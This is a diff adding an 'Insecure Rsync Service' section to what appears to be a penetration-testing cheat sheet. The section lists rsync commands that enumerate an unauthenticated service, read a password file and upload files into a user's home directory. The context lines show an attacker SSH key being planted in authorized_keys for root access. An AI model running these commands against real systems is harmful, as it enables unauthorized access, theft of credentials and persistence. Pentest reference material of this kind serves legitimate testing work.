@@ -94,6 +94,17 @@
 | cat id_rsa.pub >> authorized_keys |
 |ssh -i /root/.ssh/hacker_rsa root@192.168.1.112|
 
+### Insecure Rsync Service
+
+| for Example |
+| ------------- |
+|rsync 192.168.1.171:: |
+|rsync 192.168.1.171::files |
+| rsync -r 192.168.1.171::files/tmp/ |
+|rsync 192.168.1.171::files/home/test/mypassword.txt |
+| rsync -r 192.168.1.171::files/home/test/ |
+| rsync ./myfile.txt 192.168.1.171::files/home/test |
+|rsync -r ./myfolder 192.168.1.171::files/home/test |
 
 
 ### X 11  Common Vulnerability
